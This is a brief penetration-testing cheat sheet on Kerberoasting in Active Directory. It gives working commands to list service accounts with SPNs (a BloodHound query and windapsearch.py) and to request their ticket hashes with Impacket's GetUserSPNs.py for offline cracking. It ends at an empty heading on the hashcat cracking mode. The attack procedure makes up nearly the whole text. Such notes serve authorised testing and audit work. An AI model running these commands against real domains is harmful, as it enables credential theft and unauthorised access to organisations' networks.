# Kerberoasting

Any user can retrieve the hash of certain service accounts in an Active Directory environment. These service accounts are said to be "kerberoastable." With the hash in hand, you can attempt to crack it offline and use the cracked password for further access into the environment.

## Discover which users are "kerberoastable"

```text
Use Bloodhound's prebuilt "List All Kerberoastable Users" query.
```

or

```text
python3 windapsearch.py -u $USERNAME@$DOMAIN -p $PASSWORD --dc-ip $DOMAIN_CONTROLLER_IP --user-spns
```

## Obtain the hash of a "kerberoastable" user

```bash
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$DOMAIN_USER:$DOMAIN_USER_PASSWORD -request
```

## Hashcat mode for offline cracking
